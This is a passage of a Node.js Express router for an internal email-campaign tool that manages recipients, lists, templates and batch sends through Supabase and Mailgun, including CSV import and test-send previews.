'use strict';

// Sender API. Read endpoints + CRUD for every entity + batch sending + CSV import.
// Every async handler is wrapped with `wrap()` so thrown errors become a
// clean 500 instead of crashing the Node process.

const express = require('express');
const { getSupabase } = require('../lib/supabase');
const { sendOne, applyMergeVars, ensureEnv: ensureMailgun, buildMergeRow } = require('../lib/mailgun');

// Fetch the CRM `client` row matching a recipient name (case-insensitive).
// Returns the row (with website, ga4_property_id, ahrefs_project_id) or null.
// Silent on error — the send still works, just without CRM-joined merge vars.
// Fetch the "spr.metric_monthly.total_leads" for a client for the CURRENT
// calendar month (YYYY-MM). Returns a number or null. Best-effort — a
// missing row (e.g. this month hasn't been aggregated yet by the SPR
// pipeline) or a Supabase hiccup just returns null so the {{leads}}
// merge token renders empty in the email instead of breaking the send.
async function fetchLeadsForClient(sb, clientId) {
  if (!clientId) return null;
  try {
    const now = new Date();
    const month = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`;
    const { data } = await sb
      .schema('spr')
      .from('metric_monthly')
      .select('total_leads')
      .eq('client_id', clientId)
      .eq('month', month)
      .maybeSingle();
    return typeof data?.total_leads === 'number' ? data.total_leads : null;
  } catch {
    return null;
  }
}

// Resolve the batch's owner name to a users_profiles row so buildMergeRow
// can populate sender_email and calendar_url. Matches on full_name first
// (case-insensitive), then on the "First Last" combo formed from full_name
// tokens (so "Maria" alone in owner still finds "Maria Sanchez"). Returns
// null if nothing matches — mailgun.buildMergeRow falls back to the
// pre-existing "Constellation Marketing" default in that case.
async function lookupSenderProfile(sb, ownerName) {
  const q = String(ownerName || '').trim();
  if (!q) return null;
  try {
    // Exact case-insensitive match on full_name.
    const exact = await sb
      .from('users_profiles')
      .select('id, full_name, email, role, calendar_url')
      .ilike('full_name', q)
      .maybeSingle();
    if (exact?.data) return exact.data;
    // First-name-only match. If the batch owner is stored as "Maria" but
    // the profile is "Maria Sanchez", ilike '%Maria%' still resolves it.
    const partial = await sb
      .from('users_profiles')
      .select('id, full_name, email, role, calendar_url')
      .ilike('full_name', `%${q}%`)
      .order('full_name', { ascending: true })
      .limit(1);
    return partial?.data?.[0] || null;
  } catch {
    return null;
  }
}

async function fetchCrmClientForRecipient(sb, recipientName) {
  if (!recipientName) return null;
  try {
    const { data } = await sb
      .from('client')
      .select('id, website, ga4_property_id, ahrefs_project_id')
      .ilike('name', String(recipientName).trim())
      .maybeSingle();
    if (!data) return null;
    // Attach this month's total_leads (from spr.metric_monthly) so the
    // {{leads}} merge tag can resolve without buildMergeRow having to
    // become async. Absent data → null → renders as an empty string in
    // the email, matching how every other CRM-joined field behaves.
    const leads = await fetchLeadsForClient(sb, data.id);
    return { ...data, leads };
  } catch {
    return null;
  }
}
const { parseCsv } = require('../lib/csv');
// fetchActiveClients now reads from the OS CRM's Supabase `client` table
// (the source of truth ClickUp itself feeds into), so no new env vars are
// needed beyond the Supabase keys the app already has.
const { fetchActiveClients } = require('../lib/crm');
const { runAssigneeSync } = require('../lib/assignee-sync');

// HTML-escape helper used by the test-send banner (line ~481) and
// anywhere else we drop dynamic strings into an HTML payload.
function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

const router = express.Router();

function bad(res, status, error) {
  return res.status(status).json({ error });
}
function clean(obj, allowed) {
  const out = {};
  for (const k of allowed) if (obj[k] !== undefined) out[k] = obj[k];
  return out;
}
// Wrap async handlers so any thrown error / rejected promise is forwarded
// to Express's error middleware instead of killing the process.
const wrap = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

// ─── Health ────────────────────────────────────────────────────────────────
// Canonical health endpoint — see wiki/infra-health-protocol.md. Returns
// { ok, ts, build, env } with env-var booleans only (never values). Probed
// daily by the central health-check Worker for the green/yellow/red report.
const BUILD_TAG = 'sender-2026-05-31';
router.get('/health', (_req, res) => {
  res.json({
    ok: true,
    ts: Date.now(),
    build: BUILD_TAG,
    env: {
      SUPABASE_URL:              !!process.env.SUPABASE_URL,
      SUPABASE_SERVICE_ROLE_KEY: !!process.env.SUPABASE_SERVICE_ROLE_KEY,
      MAILGUN_API_KEY:           !!process.env.MAILGUN_API_KEY,
      MAILGUN_DOMAIN:            !!process.env.MAILGUN_DOMAIN,
      MAILGUN_FROM:              !!process.env.MAILGUN_FROM,
      CLICKUP_API_KEY:           !!process.env.CLICKUP_API_KEY,
    },
  });
});

// ─── Snapshot (one-shot read for the UI) ───────────────────────────────────
router.get('/snapshot', wrap(async (_req, res) => {
  const sb = getSupabase();

  const monthStart = new Date();
  monthStart.setDate(1); monthStart.setHours(0, 0, 0, 0);

  const [
    recipientsRes, listsRes, listMembersRes, templatesRes, batchesRes,
    queueRes, logsRes, usersRes,
    activeCountRes, sentCountRes, failedCountRes, scheduledCountRes,
  ] = await Promise.all([
    // Select * already brings original_list_id; explicit here so future
    // schema changes don't accidentally drop the column from the payload.
    sb.from('sender_clients_recipients').select('*').order('name'),
    sb.from('sender_clients_lists').select('*').order('name'),
    sb.from('sender_clients_list_members').select('list_id, recipient_id'),
    sb.from('sender_templates_emails').select('*').order('updated_at', { ascending: false }),
    sb.from('sender_sends_batches').select('*').order('created_at', { ascending: false }),
    sb.from('sender_sends_emails').select('*').order('created_at', { ascending: false }).limit(200),
    sb.from('sender_logs_events').select('*').order('occurred_at', { ascending: false }).limit(200),
    sb.from('users_profiles').select('id, full_name, email, role, calendar_url').order('full_name', { ascending: true, nullsFirst: false }),
    // KPI counts everyone who could plausibly receive an email — same set
    // the send loop uses (active / onboarding / live / hosting only).
    // Hosting-only clients need the email too — they're still active firm
    // relationships even when we're not doing the full marketing stack.
    sb.from('sender_clients_recipients').select('id', { count: 'exact', head: true }).in('status', ['active', 'onboarding', 'live', 'hosting only', 'hosting-only', 'hosting_only', 'hosting']),
    sb.from('sender_sends_emails').select('id', { count: 'exact', head: true }).eq('status', 'delivered').gte('sent_at', monthStart.toISOString()),
    sb.from('sender_sends_emails').select('id', { count: 'exact', head: true }).eq('status', 'failed').gte('created_at', monthStart.toISOString()),
    sb.from('sender_sends_batches').select('id', { count: 'exact', head: true }).eq('status', 'scheduled'),
  ]);

  res.json({
    kpis: {
      activeClients:      activeCountRes.count    ?? 0,
      emailsThisMonth:    sentCountRes.count      ?? 0,
      failedSends:        failedCountRes.count    ?? 0,
      scheduledCampaigns: scheduledCountRes.count ?? 0,
    },
    recipients:  recipientsRes.data || [],
    lists:       listsRes.data || [],
    listMembers: listMembersRes.data || [],
    templates:   templatesRes.data || [],
    batches:     batchesRes.data || [],
    queue:       queueRes.data || [],
    logs:        logsRes.data || [],
    users:       usersRes.data || [],
  });
}));

// ─── Recipients (clients) ──────────────────────────────────────────────────
// Both POST and PATCH accept an optional `list_ids: string[]` field. When
// present, list memberships are SYNCED to exactly that set (existing
// memberships removed, then the new ones inserted). Omit `list_ids` to leave
// memberships untouched.
async function syncListMemberships(sb, recipientId, listIds) {
  if (!Array.isArray(listIds)) return;
  await sb.from('sender_clients_list_members').delete().eq('recipient_id', recipientId);
  const ids = listIds.filter(Boolean);
  if (!ids.length) return;
  await sb.from('sender_clients_list_members').insert(
    ids.map(list_id => ({ list_id, recipient_id: recipientId }))
  );
}

router.post('/recipients', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','email','firm','account_manager','status','tags','client_hub']);
  if (!row.name)  return bad(res, 400, 'name is required');
  if (!row.email) return bad(res, 400, 'email is required');
  if (!Array.isArray(row.tags)) delete row.tags;
  const { data, error } = await sb.from('sender_clients_recipients').insert(row).select().single();
  if (error) return bad(res, 400, error.message);

  await syncListMemberships(sb, data.id, req.body?.list_ids);

  res.status(201).json(data);
}));

router.patch('/recipients/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','email','firm','account_manager','status','tags','client_hub']);
  const { data, error } = await sb.from('sender_clients_recipients').update(row).eq('id', req.params.id).select().single();
  if (error) return bad(res, 400, error.message);

  await syncListMemberships(sb, req.params.id, req.body?.list_ids);

  res.json(data);
}));

router.delete('/recipients/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const id = req.params.id;
  // Cascade: remove referenced rows first or the DELETE fails with a foreign-
  // key violation. The schema doesn't have ON DELETE CASCADE on these FKs,
  // so we walk the tree manually:
  //   sender_logs_events  ← references sender_sends_emails.id (via send_email_id)
  //   sender_sends_emails ← references sender_clients_recipients.id (via recipient_id)
  //   sender_clients_list_members ← references sender_clients_recipients.id

  // 1. Find every send-email row this recipient is on, so we can delete
  //    its log events first. Two-step to avoid Supabase nested-delete quirks.
  const { data: sendRows } = await sb
    .from('sender_sends_emails')
    .select('id')
    .eq('recipient_id', id);
  const sendIds = (sendRows || []).map(r => r.id);
  if (sendIds.length) {
    await sb.from('sender_logs_events').delete().in('send_email_id', sendIds);
  }

  // 2. Now safe to delete the send-email rows themselves.
  await sb.from('sender_sends_emails').delete().eq('recipient_id', id);

  // 3. Remove from every list this recipient was a member of.
  await sb.from('sender_clients_list_members').delete().eq('recipient_id', id);

  // 4. Finally, the recipient itself.
  const { error } = await sb.from('sender_clients_recipients').delete().eq('id', id);
  if (error) return bad(res, 400, `Could not delete recipient: ${error.message}`);
  res.json({ ok: true });
}));

// Bulk import via CSV. Body: { csv: "<raw text>" } or { rows: [...] }
router.post('/recipients/import', wrap(async (req, res) => {
  const sb = getSupabase();
  let rows = [];
  if (typeof req.body?.csv === 'string') {
    rows = parseCsv(req.body.csv).rows;
  } else if (Array.isArray(req.body?.rows)) {
    rows = req.body.rows;
  }
  if (!rows.length) return bad(res, 400, 'No rows to import');

  const norm = rows.map(r => {
    const k = {};
    for (const key of Object.keys(r)) k[key.toLowerCase().trim()] = r[key];
    return {
      name:            k.name || k.client_name || k.full_name || '',
      email:           k.email,
      firm:            k.firm || k.company || null,
      account_manager: k.account_manager || k.manager || null,
      status:          (k.status || 'active').toLowerCase(),
      tags:            k.tags ? String(k.tags).split(';').map(s => s.trim()).filter(Boolean) : [],
    };
  }).filter(r => r.name && r.email);

  if (!norm.length) return bad(res, 400, 'No valid rows (need name + email)');

  const { data, error } = await sb
    .from('sender_clients_recipients')
    .upsert(norm, { onConflict: 'email' })
    .select();
  if (error) return bad(res, 400, error.message);
  res.json({ imported: (data || []).length, recipients: data || [] });
}));

// ─── Lists ─────────────────────────────────────────────────────────────────
router.post('/lists', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','description','owner','is_fixed']);
  if (!row.name) return bad(res, 400, 'name is required');
  // Default a helpful description when it's a fixed (auto-sync) list.
  if (row.is_fixed && !row.description) {
    row.description = `Auto-populated from ClickUp by assignee match on "${row.name}".`;
  }
  const { data, error } = await sb.from('sender_clients_lists').insert(row).select().single();
  if (error) return bad(res, 400, error.message);
  res.status(201).json(data);
}));

router.patch('/lists/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','description','owner','is_fixed']);
  const { data, error } = await sb.from('sender_clients_lists').update(row).eq('id', req.params.id).select().single();
  if (error) return bad(res, 400, error.message);
  res.json(data);
}));

router.delete('/lists/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const id = req.params.id;
  // Cascade — same reason as recipient delete. A list is referenced by
  // sender_clients_list_members (membership) and sender_sends_batches
  // (audience). We blow away memberships, then null-out the FK on batches
  // (rather than deleting batches — they contain historical send data we
  // want to keep even after the list itself is gone), then drop the list.
  await sb.from('sender_clients_list_members').delete().eq('list_id', id);
  await sb.from('sender_sends_batches').update({ audience_list_id: null }).eq('audience_list_id', id);
  const { error } = await sb.from('sender_clients_lists').delete().eq('id', id);
  if (error) return bad(res, 400, `Could not delete list: ${error.message}`);
  res.json({ ok: true });
}));

// ─── List membership ───────────────────────────────────────────────────────
router.post('/lists/:id/members', wrap(async (req, res) => {
  const sb = getSupabase();
  const recipient_id = req.body?.recipient_id;
  if (!recipient_id) return bad(res, 400, 'recipient_id is required');
  const { error } = await sb
    .from('sender_clients_list_members')
    .insert({ list_id: req.params.id, recipient_id })
    .select();
  if (error) return bad(res, 400, error.message);
  res.json({ ok: true });
}));

router.delete('/lists/:id/members/:recipientId', wrap(async (req, res) => {
  const sb = getSupabase();
  const { error } = await sb
    .from('sender_clients_list_members')
    .delete()
    .eq('list_id', req.params.id)
    .eq('recipient_id', req.params.recipientId);
  if (error) return bad(res, 400, error.message);
  res.json({ ok: true });
}));

// ─── Templates ─────────────────────────────────────────────────────────────
router.post('/templates', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','type','subject','body_html','thumb_color']);
  if (!row.name) return bad(res, 400, 'name is required');
  if (!row.type) return bad(res, 400, 'type is required (newsletter | report)');
  const { data, error } = await sb.from('sender_templates_emails').insert(row).select().single();
  if (error) return bad(res, 400, error.message);
  res.status(201).json(data);
}));

router.patch('/templates/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','type','subject','body_html','thumb_color']);
  const { data, error } = await sb.from('sender_templates_emails').update(row).eq('id', req.params.id).select().single();
  if (error) return bad(res, 400, error.message);
  res.json(data);
}));

router.delete('/templates/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const id = req.params.id;
  // Cascade — templates are referenced by sender_sends_batches.template_id.
  // Null it out on those batches rather than deleting them so historical send
  // records (delivered/opened/clicked stats) survive the template's removal.
  await sb.from('sender_sends_batches').update({ template_id: null }).eq('template_id', id);
  const { error } = await sb.from('sender_templates_emails').delete().eq('id', id);
  if (error) return bad(res, 400, `Could not delete template: ${error.message}`);
  res.json({ ok: true });
}));

// ─── Batches (newsletter / report sends) ───────────────────────────────────
router.post('/batches', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','type','audience_list_id','template_id','status','scheduled_at','owner','ad_hoc_recipients']);
  if (!row.name) return bad(res, 400, 'name is required');
  if (!row.type) return bad(res, 400, 'type is required (newsletter | report | broadcast)');
  row.status = row.status || 'draft';
  const { data, error } = await sb.from('sender_sends_batches').insert(row).select().single();
  if (error) return bad(res, 400, error.message);
  res.status(201).json(data);
}));

router.patch('/batches/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['name','type','audience_list_id','template_id','status','scheduled_at','owner','ad_hoc_recipients']);
  const { data, error } = await sb.from('sender_sends_batches').update(row).eq('id', req.params.id).select().single();
  if (error) return bad(res, 400, error.message);
  res.json(data);
}));

// ─── User profile — per-user calendar_url (Settings page) ─────────────────
// Whitelisted to calendar_url only — everything else on users_profiles
// (full_name, email, role) is owned by the OS-app source of truth and
// mustn't be edited from the Sender UI. No session auth; the honor
// system applies here as it does for the rest of the app.
router.patch('/users-profiles/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const row = clean(req.body || {}, ['calendar_url']);
  const { data, error } = await sb
    .from('users_profiles')
    .update(row)
    .eq('id', req.params.id)
    .select('id, full_name, email, role, calendar_url')
    .single();
  if (error) return bad(res, 400, error.message);
  res.json(data);
}));

router.delete('/batches/:id', wrap(async (req, res) => {
  const sb = getSupabase();
  const id = req.params.id;
  // Cascade — a batch owns per-recipient send rows in sender_sends_emails,
  // which in turn link to log events in sender_logs_events. Delete in the
  // right order or the FK violation blocks everything.
  await sb.from('sender_logs_events').delete().eq('batch_id', id);
  await sb.from('sender_sends_emails').delete().eq('batch_id', id);
  const { error } = await sb.from('sender_sends_batches').delete().eq('id', id);
  if (error) return bad(res, 400, `Could not delete batch: ${error.message}`);
  res.json({ ok: true });
}));

// ─── TEST-SEND a batch (preview to your own email) ─────────────────────────
// Sends the batch's template to a single test email instead of the audience
// list. Useful for verifying merge variables / formatting / Mailgun delivery
// before doing the real bulk send. Does NOT touch sender_sends_emails,
// sender_logs_events, or the batch's status — it's a dry-run side-channel.
// Body: { to: "your@email.com", sample_recipient_id?: "<uuid>" }
//   - `to` is the email that receives the test (required)
//   - `sample_recipient_id` (optional) — pull merge vars from this real
//     recipient instead of using "Test Recipient" placeholders
router.post('/batches/:id/test-send', wrap(async (req, res) => {
  const sb = getSupabase();
  ensureMailgun();

  // Accept either `to` (single email, kept for backward compat) or
  // `to_list` (string of comma/space/newline-separated emails — the new
  // modal sends this so the user can test against multiple inboxes at once).
  const rawTo = req.body?.to_list || req.body?.to || '';
  const matches = String(rawTo).match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
  const seen = new Set();
  const toEmails = matches.map(x => x.trim()).filter(x => {
    const k = x.toLowerCase();
    if (seen.has(k)) return false;
    seen.add(k); return true;
  });
  if (!toEmails.length) {
    return bad(res, 400, 'At least one valid email address is required');
  }
  const sampleRecipientId = req.body?.sample_recipient_id || null;

  const { data: batch, error: batchErr } = await sb
    .from('sender_sends_batches').select('*').eq('id', req.params.id).single();
  if (batchErr || !batch)      return bad(res, 404, batchErr?.message || 'Batch not found');
  if (!batch.template_id)      return bad(res, 400, 'Batch has no template — assign one first');

  const { data: tpl, error: tplErr } = await sb
    .from('sender_templates_emails').select('*').eq('id', batch.template_id).single();
  if (tplErr || !tpl) return bad(res, 400, 'Template not found');

  // Same sender lookup as the real /send handler so test emails preview
  // the correct sign-off + calendar link.
  const sender = await lookupSenderProfile(sb, batch.owner);

  // Pull merge-variable values from a sample recipient if one was given,
  // OR from the first recipient on the audience list if available, OR
  // fall back to clearly-labeled placeholders so the test obviously isn't
  // pretending to be a real client.
  // Build the merge row using the shared helper so ALL 22 variables are
  // populated in the test-send preview + email. Overrides force the
  // test-send email to be delivered to toEmails[0] even when the sample
  // recipient row has a real client email — we don't want to accidentally
  // send test copy to a live client.
  let mergeRow = buildMergeRow({
    recipient: {
      name:            'Test Recipient',
      first_name:      'Test',
      email:           toEmails[0],
      firm:            'Test Firm LLP',
      account_manager: 'Test Manager',
      status:          'live',
      client_hub:      'https://example.goconstellation.com/hub/test',
    },
    batch,
    sender,
    crmClient: null,
    overrides: { email: toEmails[0] },
  });
  if (sampleRecipientId) {
    const { data: sample } = await sb
      .from('sender_clients_recipients')
      .select('name, first_name, email, firm, account_manager, status, client_hub')
      .eq('id', sampleRecipientId)
      .single();
    if (sample) {
      const crmClient = await fetchCrmClientForRecipient(sb, sample.name);
      mergeRow = buildMergeRow({
        recipient: sample,
        batch,
        sender,
        crmClient,
        overrides: { email: toEmails[0] },  // still send to test addr
      });
    }
  } else if (batch.audience_list_id) {
    // Grab the first active member of the audience list so the test email
    // shows what a real send to that list would look like.
    const { data: members } = await sb
      .from('sender_clients_list_members')
      .select('recipient:sender_clients_recipients(name, first_name, email, reporting_email, firm, account_manager, status, client_hub)')
      .eq('list_id', batch.audience_list_id)
      .limit(5);
    const sample = (members || [])
      .map(m => m.recipient)
      .find(r => r && (r.status === 'active' || r.status === 'live' || r.status === 'onboarding'));
    if (sample) {
      const crmClient = await fetchCrmClientForRecipient(sb, sample.name);
      mergeRow = buildMergeRow({
        recipient: sample,
        batch,
        sender,
        crmClient,
        overrides: { email: toEmails[0] },
      });
    }
  }

  const subjectBase = tpl.subject || batch.name || 'Test send';
  const subject     = `[TEST] ${applyMergeVars(subjectBase, mergeRow)}`;
  const html        = `
    <div style="background:#fef3c7;border-left:4px solid #f59e0b;padding:12px 16px;margin:0 0 16px;font:14px/1.5 -apple-system,BlinkMacSystemFont,sans-serif;color:#92400e;">
      <strong>⚠️ This is a TEST send.</strong> Real audience list was NOT contacted. Merge variables filled from <em>${esc(mergeRow.name)}</em>.
    </div>
    ${applyMergeVars(tpl.body_html || '', mergeRow)}
  `;

  // Send to each test address. Don't bail on first failure — we want a
  // per-address breakdown so the user can tell which inbox didn't get it.
  //
  // We ALSO write a row into sender_logs_events for each test address so the
  // Email Logs page shows every event — including tests — with a clearly
  // distinct "test" pill and a "(test only)" meta line. That way the person
  // who fired the test can confirm it went out without pretending it was a
  // real send. send_email_id and batch_id are left null: no queue row
  // exists for a test-send, and the audience batch stays untouched (that's
  // still the whole point of test-send being a "dry-run side-channel").
  // Small helper — Supabase-js .insert() does NOT throw on constraint
  // violations, it returns { data, error }. We were relying on try/catch,
  // which meant every log-row failure was invisible. Wrap it so we
  // actually surface the message to pm2 logs.
  async function logTestEvent(addr, meta) {
    try {
      const { error } = await sb.from('sender_logs_events').insert({
        type: 'test',
        recipient_email: addr,
        meta,
      });
      if (error) {
        console.warn('test-send: log insert failed:', error.message, error.details || '');
      }
    } catch (thrown) {
      console.warn('test-send: log insert threw:', thrown?.message || thrown);
    }
  }
  const results = [];
  for (const addr of toEmails) {
    try {
      const out = await sendOne({ to: addr, subject, html });
      results.push({ to: addr, ok: true, id: out?.id || null });
      await logTestEvent(addr, `(test only) — merged from ${mergeRow.name || 'test recipient'}`);
    } catch (e) {
      results.push({ to: addr, ok: false, error: String(e.message || e).slice(0, 500) });
      await logTestEvent(addr, `(test only) — FAILED: ${String(e.message || e).slice(0, 200)}`);
    }
  }
  const okCount   = results.filter(r => r.ok).length;
  const failCount = results.length - okCount;
  return res.json({
    ok:         failCount === 0,
    to:         toEmails,
    mergedFrom: mergeRow.name,
    results,
    sentCount:  okCount,
    failedCount: failCount,
  });
}));

// ─── SEND a batch ──────────────────────────────────────────────────────────
router.post('/batches/:id/send', wrap(async (req, res) => {
  const sb = getSupabase();
  ensureMailgun();   // throws → caught by wrap → 500 with message

  const { data: batch, error: batchErr } = await sb
    .from('sender_sends_batches').select('*').eq('id', req.params.id).single();
  if (batchErr || !batch) return bad(res, 404, batchErr?.message || 'Batch not found');

  if (!batch.template_id) return bad(res, 400, 'Batch has no template');
  if (!batch.audience_list_id && !batch.ad_hoc_recipients) {
    return bad(res, 400, 'Batch has no audience list and no ad-hoc recipients');
  }

  const { data: tpl, error: tplErr } = await sb
    .from('sender_templates_emails').select('*').eq('id', batch.template_id).single();
  if (tplErr || !tpl) return bad(res, 400, 'Template not found');

  // Look up the sender's profile so buildMergeRow can populate
  // {{sender_email}}, {{sender_first_name}}, {{calendar_url}}. batch.owner
  // is a users_profiles.full_name; if the batch predates the Owner
  // dropdown (owner is NULL), buildMergeRow falls back to
  // "Constellation Marketing" and empty calendar_url.
  const sender = await lookupSenderProfile(sb, batch.owner);

  // Build the recipient list. Two paths:
  //  1. Ad-hoc recipients (typed into the batch modal for beta-testing) take
  //     priority. We synthesize lightweight in-memory rows — no DB writes
  //     for fake "clients", they don't show up in the Client Lists view.
  //  2. Saved audience list — read the members and filter by sendable status.
  let recipients = [];

  // Effective send-to address: reporting_email (CRM override) wins over
  // the ClickUp-synced .email. Hoisted here so BOTH the ad-hoc branch
  // and the audience-list branch can call it (ad-hoc rows only have
  // .email; audience-list rows can have either).
  const sendToOf = (r) => (String(r?.reporting_email || '').trim() || String(r?.email || '').trim());
  if (batch.ad_hoc_recipients && String(batch.ad_hoc_recipients).trim()) {
    const matches = String(batch.ad_hoc_recipients).match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
    const seen = new Set();
    const adHocEmails = matches.map(x => x.trim()).filter(x => {
      const k = x.toLowerCase();
      if (seen.has(k)) return false;
      seen.add(k); return true;
    });
    recipients = adHocEmails.map(addr => ({
      id:              null,                 // synthetic — no DB row
      name:            addr.split('@')[0],
      email:           addr,
      firm:            'Test Firm',
      account_manager: 'Test Manager',
      status:          'active',
      _adHoc:          true,
    }));
    if (!recipients.length) return bad(res, 400, 'Ad-hoc recipients field had no parseable email addresses');
  } else {
    const { data: members, error: memErr } = await sb
      .from('sender_clients_list_members')
      .select('recipient:sender_clients_recipients(*)')
      .eq('list_id', batch.audience_list_id);
    if (memErr) return bad(res, 400, memErr.message);

    // Statuses we'll actually send to. Was just 'active' — now includes
    // 'onboarding' and 'live' because the ClickUp CRM uses both, and the
    // monthly reports need to reach onboarding clients too.
    const SENDABLE_STATUSES = new Set([
      'active', 'onboarding', 'live',
      'hosting only', 'hosting-only', 'hosting_only', 'hosting',
    ]);
    // hasRealEmail = the field has at least one address that matches the
    // standard email shape. Placeholder values like "(no-email-clickup-…)"
    // synthesized for emailless ClickUp clients fail this check and are
    // silently filtered out of the send — they appear in the All Clients
    // list but never receive emails until a real address is added in
    // ClickUp and the team re-syncs.
    const hasRealEmail = (s) =>
      /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(String(s || ''));

    recipients = (members || [])
      .map(m => m.recipient)
      .filter(r => r && hasRealEmail(sendToOf(r)) && SENDABLE_STATUSES.has(String(r.status || '').toLowerCase()));

    if (!recipients.length) return bad(res, 400, 'No sendable recipients in this list (statuses checked: active / onboarding / live / hosting only — must have a real email)');
  }

  await sb.from('sender_sends_batches').update({
    status: 'sending',
    recipients_count: recipients.length,
  }).eq('id', batch.id);

  // For ad-hoc batches, recipient_id will be null on every row. We OMIT
  // the property rather than send null explicitly so Postgres uses its
  // column default — works whether the FK column is nullable or not, as
  // long as the DB migration to drop NOT NULL has been run.
  const queueRows = recipients.map(r => {
    const qr = {
      batch_id: batch.id,
      // Prefer reporting_email (CRM override) over the sync'd .email
      // from ClickUp. sendToOf is defined above.
      recipient_email: sendToOf(r),
      status: 'queued',
    };
    if (r.id) qr.recipient_id = r.id;
    return qr;
  });
  const { data: queued, error: qErr } = await sb
    .from('sender_sends_emails').insert(queueRows).select();
  if (qErr) return bad(res, 500, qErr.message);

  let delivered = 0, failed = 0;
  // Track per-recipient failures so the UI can show the actual Mailgun error
  // instead of just a "N failed" count. Without this, debugging required
  // opening Email Logs and reading each row by hand.
  const failures = [];

  // ClickUp's CRM stores multi-email fields with any separator (commas,
  // semicolons, newlines, even just spaces between addresses). Rather than
  // split on a delimiter list and risk missing one, extract every
  // email-shaped substring from the value. Mailgun then gets one valid
  // address per call.
  const splitEmails = (s) => {
    if (!s) return [];
    const matches = String(s).match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
    const seen = new Set();
    return matches.map(x => x.trim()).filter(x => {
      const k = x.toLowerCase();
      if (seen.has(k)) return false;
      seen.add(k);
      return true;
    });
  };

  for (const qi of queued) {
    // Match by the effective send-to (reporting_email override wins over
    // sync'd email) — works for both real (id) and ad-hoc (id=null) rows,
    // since ad-hoc batches can have many recipients sharing the same null id.
    const recipient = recipients.find(r => sendToOf(r) === qi.recipient_email) || {};
    const effectiveTo = sendToOf(recipient);
    const addresses = splitEmails(effectiveTo);
    if (!addresses.length) {
      // No valid email parsed — surface as a failure for this queue row.
      failed++;
      failures.push({ email: effectiveTo || '(empty)', reason: 'No valid email address could be parsed from this row' });
      await sb.from('sender_sends_emails').update({
        status: 'failed',
        error_message: 'No valid email parsed',
      }).eq('id', qi.id);
      continue;
    }

    // Full 22-variable merge row. Joins CRM client row by name for
    // website / ga4_property_id / ahrefs_project_id. Empty strings if
    // no CRM match — the template renders '' where those tags appear.
    const crmClient = await fetchCrmClientForRecipient(sb, recipient.name);
    const mergeRow  = buildMergeRow({
      recipient,
      batch,
      sender,
      crmClient,
      overrides: { email: addresses[0] },   // in case recipient.email has multiple
    });
    const subject = applyMergeVars(tpl.subject || batch.name, mergeRow);
    const html    = applyMergeVars(tpl.body_html, mergeRow);

    // Send to each parsed address. We count this queue row as "delivered"
    // if at least one of its addresses succeeded — Mailgun-side stats are
    // tracked per-address via the logs_events rows below.
    let anyOk    = false;
    let lastErr  = null;
    for (const addr of addresses) {
      try {
        await sendOne({ to: addr, subject, html });
        anyOk = true;
        await sb.from('sender_logs_events').insert({
          send_email_id: qi.id, batch_id: batch.id,
          type: 'sent', recipient_email: addr,
        });
      } catch (err) {
        lastErr = String(err.message || err).slice(0, 500);
        failures.push({ email: addr, reason: lastErr });
        await sb.from('sender_logs_events').insert({
          send_email_id: qi.id, batch_id: batch.id,
          type: 'failed', recipient_email: addr,
          meta: lastErr,
        });
      }
    }

    if (anyOk) {
      delivered++;
      await sb.from('sender_sends_emails').update({
        status: 'delivered',
        sent_at: new Date().toISOString(),
      }).eq('id', qi.id);
      // Only stamp the recipient's last_emailed_at if this is a real saved
      // client (ad-hoc test rows have id=null and aren't in the DB).
      if (recipient.id) {
        await sb.from('sender_clients_recipients')
          .update({ last_emailed_at: new Date().toISOString() })
          .eq('id', recipient.id);
      }
    } else {
      failed++;
      await sb.from('sender_sends_emails').update({
        status: 'failed',
        error_message: lastErr || 'All addresses failed',
      }).eq('id', qi.id);
    }
  }

  await sb.from('sender_sends_batches').update({
    status: failed === recipients.length ? 'failed' : 'sent',
    sent_at: new Date().toISOString(),
  }).eq('id', batch.id);

  res.json({
    ok: true,
    batchId: batch.id,
    attempted: recipients.length,
    delivered,
    failed,
    failures,                                          // [{ email, reason }, …]
  });
}));

// ─── ClickUp sync + Rotating List ──────────────────────────────────────────
//
// Each list row in sender_clients_lists has an `is_fixed` flag. Rows with
// is_fixed=true are the account-manager lists — the sync auto-populates
// them from ClickUp Assignees matching the list name. is_fixed=false lists
// are manual (like the Rotating List).
//
// Managing the roster: use the ⚙ Manage lists button in the Sender UI to
// toggle is_fixed on/off or add a new fixed list. When someone joins or
// leaves CS, no code deploy is needed — just flip the toggle.
//
// The SENDER_FIXED_LISTS env var is a fallback used only when the DB has
// zero is_fixed=true rows (bootstrap case). Once the migration seeds the
// initial roster, the env var is ignored.

const FALLBACK_FIXED_LISTS = (process.env.SENDER_FIXED_LISTS || 'Alejandra,Faith,Luiza,Maria')
  .split(',').map(s => s.trim()).filter(Boolean);
const ROTATING_LIST_NAME = (process.env.SENDER_ROTATING_LIST_NAME || 'Rotating List').trim();

// Load the current set of fixed-list names from the DB. Falls back to the
